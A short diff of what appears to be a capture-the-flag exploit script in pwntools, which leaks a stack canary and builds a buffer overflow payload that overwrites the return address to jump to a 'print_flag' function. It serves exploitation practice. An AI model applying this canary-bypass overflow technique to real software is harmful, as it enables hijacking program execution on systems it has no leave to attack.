@@ -20,9 +20,9 @@ log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
-flag_addr = 0x401236 
+# flag_addr = 0x401236 
 offset_to_canary = 0x7fffffffcdf8 - 0x7fffffffcdb0
-payload = b'A' * offset_to_canary + p64(canary) + b'B' * 8 + p64(flag_addr) # Add your payload here
+payload = b'A' * offset_to_canary + p64(canary) + b'B' * 8 + p64(win) # Add your payload here
 r.sendline(payload)
 
 r.recvline()
